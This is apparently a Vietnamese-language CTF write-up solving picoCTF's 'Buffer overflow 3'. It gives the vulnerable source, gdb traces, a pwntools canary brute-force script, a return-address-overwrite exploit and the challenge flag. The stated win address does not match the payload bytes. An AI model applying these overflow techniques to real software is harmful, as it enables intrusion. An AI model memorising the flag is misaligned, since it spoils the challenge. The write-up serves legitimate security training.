## Buffer overflow 3
# Description:
Do you think you can bypass the protection and get the flag?

Additional details will be available after launching your challenge instance.

# Source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}

```
# Solution:
* Challenge này sử dụng Canary như là một biến kiểm tra xem người dùng có đang cố khai thác lỗ hổng tràn bộ đệm bằng cách đọc từ file `canary.txt` một từ có độ dài 4 bytes, sau đó kiểm tra xem canary có bị thay đổi so với giá trị global ban đầu hay không.
* Mở gdb, đặt breakpoint ở `vuln+211` và truyền vào một pattern độ dài 100.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd58  →  0x61616171 ("qaaa"?)
$ebx   : 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
$ecx   : 0xffffcd18  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x64
$esp   : 0xffffccc0  →  0xffffcd58  →  0x61616171 ("qaaa"?)
$ebp   : 0xffffcd68  →  0x61616175 ("uaaa"?)
$esi   : 0x08049640  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x0804955c  →  <vuln+00d3> call 0x8049180 <memcmp@plt>
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
....
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
memcmp@plt (
   [sp + 0x0] = 0xffffcd58 → 0x61616171,
   [sp + 0x4] = 0x0804c054 → "test"
)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804955c in vuln (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804955c → vuln()
```

* Thấy được rằng chương trình thực sự bị tràn bộ đệm tuy nhiên `memcmp` sẽ check canary với nội dung ở file canary.txt (Do chạy ở local nên mình tạo một file canary.txt với nội dung là 'test')
* Check số offset đến canary
```
gef➤  pattern offset 0x61616171
[+] Searching for '71616161'/'61616171' with period=4
[+] Found at offset 64 (little-endian search) likely
```

* Do việc kiểm tra canary này chỉ so sánh các ký tự nên nếu đầu vào là `aaaa..(64 kí tự)..aaat` hoặc `aaa..(64 kí tự)..aaate` hoặc `aaa..(64 kí tự)..aaates` hoặc `aaa..(64 kí tự)..aaatest` thì vẫn có thể by pass.
* Tạo một chương trình để brute force canary bằng cách tìm từng chữ từ trái qua phải
```c
from pwn import *
import time

ch = "ABCDEFGHIKLMNOPQRSTUVWXYZabcdefghiklmnopqrstuvwxyz1234567890"
# host, port = "saturn.picoctf.net", 51122
canary = ""
size = 65


while (len(canary) < 4):
	for i in ch:
		tmp = canary
		tmp += i
		p = process("./vuln")
		# p = remote(host, port)
		p.recvuntil(b">")
		p.sendline(str(size))
		p.recvuntil(b">")
		p.sendline('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + tmp)

		if ("Ok" in str(p.recvall())):
			size += 1
			canary = tmp
			break

		p.close()
		time.sleep(0.1)
	print(canary)
```

* Chạy ở local và tìm đc canary
```
└─$ python3 brute_force.py
...
[+] Starting local process './vuln': pid 953
[+] Receiving all data: Done (29B)                                                                                                                                                                               [*] Process './vuln' stopped with exit code 0 (pid 953)
test
```
* Chương trình đã hoạt động, bây giờ cần tìm offset để ta có thể ghi đè địa chỉ hàm `win`
```
gef➤  r
Starting program: /mnt/c/Users/levan/OneDrive/Documents/CTF/picoCTF/buffer_overflow3/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 168
Input> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
* Đầu vào sẽ là 64 kí tự + canary + pattern
* Chương trình bị crash thu được lỗi
```
─────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0
$ebx   : 0x61616163 ("caaa"?)
$ecx   : 0x0
$edx   : 0xf7fb18a0  →  0x00000000
$esp   : 0xffffcd70  →  "faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara[...]"
$ebp   : 0x61616164 ("daaa"?)
$esi   : 0x08049640  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616165 ("eaaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
─────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd70│+0x0000: "faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara[...]"    ← $esp
0xffffcd74│+0x0004: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
0xffffcd78│+0x0008: "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"
0xffffcd7c│+0x000c: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0xffffcd80│+0x0010: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcd84│+0x0014: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcd88│+0x0018: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcd8c│+0x001c: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
───────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616165
───────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x61616165 in ?? (), reason: SIGSEGV
```
* Thu được offset
```
gef➤  pattern offset 0x61616165
[+] Searching for '65616161'/'61616165' with period=4
[+] Found at offset 16 (little-endian search) likely
```

* Vậy ta cần một chuỗi bao gồm 64 kí tự + canary + 16 kí tự + win address
* Bây giờ tiến hành remote để lấy canary từ server, ta có được `BiRd`
* Địa chỉ hàm win là `0x08048336`
* File exploit.py để khai thác:
```
from pwn import *

host, port = "saturn.picoctf.net", 51452
p = remote(host, port)
p.sendline(b'200')
p.sendline(b'A'*64 + b'BiRd' + b'B'*16 + b'\x36\x93\x04\x08')

print(p.recvall())
p.close()
```

Flag : `picoCTF{Stat1C_c4n4r13s_4R3_b4D_fba9d49b}`